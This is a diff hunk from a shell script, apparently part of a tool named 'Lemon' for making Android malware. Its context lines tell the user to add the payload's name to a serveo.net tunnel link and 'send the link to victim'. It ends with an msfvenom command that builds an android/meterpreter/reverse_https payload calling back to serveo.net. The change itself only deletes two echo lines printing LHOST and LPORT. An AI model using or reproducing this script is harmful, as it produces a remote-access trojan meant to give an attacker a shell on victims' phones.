@@ -24,8 +24,6 @@ echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡
 echo "[+] Put your payload's name after the link you get from sh ssh" | lolcat
 echo [+] For Example : lente.serveo.net/yourpayload.apk | lolcat
 echo [+] Send the link to victim | lolcat
-echo [+] LHOST=serveo.net | lolcat
-echo [+] LPORT=$port | lolcat
 echo [+] This may take a few minutes | lolcat
 echo ‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡ | lolcat
 msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT=$port R> $HOME/Lemon/$name & PID=$!
